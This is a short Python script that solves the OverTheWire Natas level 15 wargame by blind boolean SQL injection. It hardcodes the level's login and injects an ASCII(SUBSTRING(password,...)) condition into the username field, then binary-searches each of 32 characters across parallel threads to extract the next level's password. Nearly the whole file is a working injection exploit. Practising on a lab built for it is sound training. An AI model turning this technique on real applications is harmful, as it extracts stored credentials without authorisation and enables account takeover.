import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://natas15.natas.labs.overthewire.org/index.php"
AUTH = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")

session = requests.Session()
session.auth = AUTH


def get_char(position):
    low = 32
    high = 126

    while low <= high:
        mid = (low + high) // 2

        payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1)) > {mid} -- '

        response = session.post(
            URL,
            data={"username": payload},
            timeout=10
        )

        if "This user exists" in response.text:
            low = mid + 1
        else:
            high = mid - 1

    return position, chr(low)


password = ["?"] * 32

with ThreadPoolExecutor(max_workers=16) as executor:
    futures = [executor.submit(get_char, i) for i in range(1, 33)]

    for future in as_completed(futures):
        pos, ch = future.result()
        password[pos - 1] = ch
        print(f"[{pos:02}] -> {ch} | Current: {''.join(password)}")

print("\nPassword:", "".join(password))